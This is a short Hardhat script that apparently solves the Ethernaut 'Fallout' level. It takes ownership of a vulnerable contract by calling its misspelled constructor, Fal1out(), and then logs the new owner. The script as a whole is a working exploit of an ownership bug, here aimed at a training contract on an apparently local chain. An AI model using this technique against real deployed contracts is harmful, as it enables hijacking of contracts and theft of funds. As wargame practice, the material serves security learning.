import { ethers } from "hardhat";

async function main(){
    // random player address
    let player = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
    // fallout contract address
    let address_a = "0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0";

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("Fallout", address_a, signer);

    // intended constructor function name is misspelled, so it acts as a normal function, which can be called anytime
    let exploit = await contract_a.Fal1out();

    // verify we are indeed owner
    let owner = await contract_a.owner();
    console.log(owner);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
